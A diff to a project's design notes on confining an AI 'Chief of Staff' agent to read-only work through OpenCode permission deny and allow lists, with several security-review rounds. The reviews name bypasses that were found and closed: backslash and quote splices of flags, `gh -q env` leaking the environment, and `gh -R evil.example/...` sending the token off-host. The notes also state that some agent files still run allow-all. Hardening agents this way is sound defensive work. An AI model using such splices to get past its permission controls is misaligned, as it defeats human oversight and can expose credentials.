@@ -3666,3 +3666,111 @@ waiting at most 3 s; only in the ask repo or the worker's own repo) and refuses 
 never raised against a ghost that only a send on the same ghost could clear. The check is best effort: with no ask
 repo configured, an offline or slow `gh`, or any answer other than a clear Not Found, the report is accepted. A report
 without `--issue` (the worker's own ask) is not looked up.
+
+## The Chief of Staff is read-only by native permissions (#105)
+
+The Chief of Staff's definition (`agents/opencode/chief-of-staff.md`) carries an OpenCode v2 `permissions:` list instead of a judge or an
+instruction. The first rule is `* * deny`; allows follow (reads, `fleet-switchboard`, `gh`, a few `git`/`az`/`curl` read shapes); deny
+guards come last (redirects, `$()`, `gh api` writes, `--admin`/`--auto`, `gh repo|secret|variable|release|auth|extension|alias`, `gh workflow run`,
+`az` write verbs and secret values, `curl` to localhost, private ranges or with userinfo, secret-bearing paths). Last match wins and any deny
+denies. **Nothing asks**: a denial is hard ("Permission denied: shell") and the Chief of Staff routes the work to the owning orchestrator
+instead of blocking on a dialog. Principal's word (Adam): "I don't have a problem with you using gh to write comments or close/merge PRs";
+a questionable PR is still held and raised (instruction level, not enforceable by a pattern).
+
+Pitfalls found by `tools/cos-permissions-proof/` (read its README):
+- an agent frontmatter with a `name:` key makes v2 ignore the whole `permissions:` list (the agent runs allow-all). The cos file has none;
+  `TestChiefOfStaffNativePermissions` and `TestAgentDefinitions` assert it. The coder, orchestrator and cos-subagent files still carry `name:`
+  and the v1 `permission:` form: their rules are not enforced either; step 2.
+- patterns are whole-value globs over a scanner-split command (`*` and `?` only, no character classes); `x *` matches `x` and `x args`, never `xy`.
+  Quoted arguments keep their quotes, so `curl -s 'https://...'` is denied: write the URL unquoted.
+- an explicit deny does not invoke plugin hooks, so denials are proved by "nothing ran, nothing asked", not by a log line.
+
+Proof: `python3 tools/cos-permissions-proof/run.py`: allowed commands all run; hostile ones are denied-not-run (a hand-triaged `harmless` list
+of read-only shapes aside); asked is 0.
+
+**Rollout.** Reinstall the agents (the installer copies `agents/opencode/*.md`) and restart the Chief of Staff's opencode session; a running
+session keeps the definition it began with. This is a `~/.config` change: only on the owner's yes via the Chief of Staff.
+**Rollback.** Restore the previous `chief-of-staff.md` (`git revert` of the PR, reinstall, restart).
+
+**Draft, NOT applied: a global never-list.** A fleet-wide floor that holds even if an agent file is wrong (in `opencode.jsonc`; policy
+denials read "Blocked by configuration policy"). Shape to be confirmed against the v2 `experimental.policies` schema before anyone applies it:
+
+```jsonc
+"experimental": { "policies": [
+  { "action": "shell", "resource": "*sudo*", "effect": "deny" },
+  { "action": "shell", "resource": "bash *", "effect": "deny" },   // and sh, zsh, eval, exec
+  { "action": "shell", "resource": "*rm -rf*", "effect": "deny" },
+  { "action": "shell", "resource": "git push --force*", "effect": "deny" },
+  { "action": "shell", "resource": "gh repo delete*", "effect": "deny" }
+] }
+```
+
+Orchestrators (step 2) need data-driven allows. The last-3-days shell calls of orchestrators lead with: `cat`, `gh api`, `fleet-switchboard send`,
+`echo`, `git fetch`, `date`, `git show`, `fleet-switchboard report`, `python3`, `gh pr view`, `fleet-switchboard notice`, `gh pr merge`, `remind`,
+`gh pr checks`, `grep`, `gh issue comment`, ... A standing order lets orchestrators `gh pr merge --admin`: the cos guard against `--admin` is
+for the cos only. An orchestrator's pending ask has no timeout in OpenCode v2 (the docs list none); the switchboard already tiers it
+(`decisions_cos_grace_seconds`, 300s, then the human) and can answer it (`permission_reply`), so a timeout-to-deny would be a switchboard action.
+
+### Review changes at f1c3c4f (#108)
+
+- `handoff`, `subagent`, `task`, `launch` are denied: handoff starts a `cos-subagent` whose own definition is allow-all.
+- (Superseded by the next section: answer/resolve/supersede and orders add/remove are allowed again, with the CLI as the lock.) `decisions batch` stays denied. **For the owner:** with this the Chief of Staff cannot answer an
+  orchestrator's prompt itself; it escalates. If you want it to answer under your standing orders, grant exactly `fleet-switchboard decisions answer *`
+  (and `resolve *`) knowingly, or step 2 decides who answers.
+- Expansion bypasses: `$`, `{`, `}` and `~` anywhere in a command are denied; `*`, `?` and `[` are already denied by the scanner. OpenCode normalises `\`
+  to `/` in both the pattern and the command, so a backslash guard would deny every path; `./` and `../` anywhere are denied instead (`.\ssh` is `./ssh`).
+  Dot-segments (`/.x`, ` .x`, `:.x`, `=.x`) are denied everywhere, plus secret-looking names for the readers, `/etc` and friends. The `read`, `grep`
+  and `glob` tools deny `*/.*` and secret names too.
+- `az` is allowed only as `az <group> [<sub>] show|list` (verb in the verb position, so `az vm resize --name show` cannot match), plus `graph query`,
+  `monitor log-analytics query`, `webapp log tail`. `az account|ad|rest|login|extension|containerapp|appconfig|deployment|webapp config|app-insights`
+  and `--debug` are denied. `gh api` only as `gh api repos/*`, without `..`, contents, logs, actions, keys, secrets, user, notifications.
+- `gh`: the owner's words cover comments and close/merge; Adam's later answers also covered reopen, edit, ready and review. `--approve` is denied
+  (an approval can satisfy the independent-review rule); `gh issue close|reopen|edit`, `gh pr edit|ready|reopen` remain on his answers.
+- `curl` is denied (second review). `git log -p|-S|-G` and `git show *:*` are denied; `git show HEAD`/`git diff` can still show a committed secret. A backslash
+  inside a secret-looking filename that is not in a dot-directory (`id_\rsa`) is not caught.
+
+### Decisions and orders are allowed again, with the CLI as the lock (#105, cos decision)
+
+- The Chief of Staff's permissions allow `decisions answer|resolve|escalate|supersede` and `orders add|remove` as exact patterns
+  (`fleet-switchboard <noun> <verb> *`). `decisions batch` stays denied (it is an orchestrator's command). Any global flag before the noun or verb
+  (`decisions --repo X answer`, `orders --cos add`) matches no allow and is denied explicitly.
+- **The CLI keeps the Chief of Staff to its own tier.** `answer`, `resolve` and `supersede` run as the chief-of-staff role refuse any decision that
+  is not on the `cos` tier (an owner's, `human`, one); the refusal is audited (`decisions.refused`). `escalate` of a human-tier one is a no-op as before.
+  You, in a plain shell, are unrestricted. Tested per subcommand and per tier (`TestCosAnswersOnlyItsOwnTier`). Two baseline goldens changed
+  on purpose (a cos `resolve`/`supersede` of an owner-tier item is now refused).
+- **Every `orders add|remove` by the Chief of Staff is seen at once.** The command posts a comment on the charter (exact text, who ran it, "if the
+  owner did not give this order, remove it") and records a heads-up (`order-notices.json`, kind `notice` in the Heads-up section of the panel)
+  that drops after a day or when you run `fleet-switchboard notice ack <id>` in a plain shell (an agent is refused). The order stands if the
+  comment fails; the command then says so and exits 1.
+
+### Second review (#108 at fa7dc6f)
+
+- Shell text splices: quotes are denied in every read command (`git cat head tail grep wc ls az gh` reads, merge/ready/reopen); free text (`send`, `report`,
+  `--body`) keeps them, and each dangerous flag has guards for any prefix followed by a quote or slash (`--ad"min"`, `--ad\min`, `--body-fi"le"`), plus
+  `--"` and `-"`. `.e?v` globs are already denied by the scanner. `gh pr review` is denied outright (comment with `gh pr comment`).
+- `curl` is denied for the Chief of Staff: use `gh api repos/...`.
+- Not solved by patterns: a quote inside free text can still hide an arbitrary flag spelling that has no guard; the guards cover the flags that matter.
+
+### Third review (#108 at eaad941): the backslash class
+
+OpenCode normalises `\` to `/` in the text the rules see; the shell then removes the backslash, so `--\admin` ran as `--admin`. A deny list cannot tell `a\b` from a
+path `a/b`. What was done instead:
+- `*-/*` is denied (every `--\flag` and `-\X`), plus every dangerous flag with every prefix followed by `/`, a quote or nothing (`--a/`, `--ad/`, ...).
+- Mid-word splices cannot be denied, so the shapes that carried names are positive lists: **no `cat|head|tail|wc|grep|git grep` in the shell** (the `read`, `grep` and
+  `glob` tools see the real path), and `gh api` only as `repos/*/*/issues[/*]`, `pulls[/*]`, `commits`. `az` has no `--query` (and capitalised secret spellings are denied).
+- Plain tokens only for every non-message command: `! # ( ) [ ] { } < > & ; | " '` are denied after the command (a `#` stays for `fleet-switchboard` refs). Message
+  commands (`send`, `report`, `remind`, `notice`, `intent`, `decisions answer|resolve|escalate|supersede --note`, `orders add`, `gh ... comment|close|edit`) keep quotes; `$` and backtick are denied everywhere.
+- Advisory, not changed: `decision_actor` treats an unidentifiable caller as "you"; the Chief of Staff cannot reach that through its permissions (env prefix, `env` and `--from` are denied or Lab-only).
+- The replay corpus now holds the splice class explicitly (backslash after the dash, mid-word, quote, concatenation, `$IFS`, brace, glob, in every allowed command shape).
+
+### Fourth review (#108 at 5308be7)
+
+`gh ... -q env` printed the process environment (gh's jq has `env`). The short `-q` and `-t` (and `gh * --q*`, and a `-?q` cluster such as `-sq`) are denied for every `gh` shape, with the
+`-\q` splice already covered by `*-/*`. Also denied: `gh api --verbose|--include|--preview|--cache|--slurp|-i`, `git --orderfile|-O`. Left as documented residuals: patch content of committed
+secrets, the `read`/`grep`/`glob` tools' resource (the shell replay cannot exercise them), the `decision_actor` fail-open (advisory; unreachable from the Chief of Staff's permissions).
+
+### Fifth review (#108 at f08f99e): no foreign host for `gh`
+
+`gh -R evil.example/o/r ...` or a foreign-host URL would send gh's request (and token) to that host. Denied for every `gh` shape: `-R`/`--repo` in any host form (`HOST/OWNER/REPO`, a dot before the first slash, `@`),
+and, for the read and merge shapes, any `://` or `@` argument and `gh api http*`; for the comment/close/edit shapes a URL in first (selector) position. `-R OWNER/REPO` stays allowed. A URL
+inside free text, or a selector URL placed after flags in a comment/close/edit command, is not caught (documented residual; the message commands must keep their text).
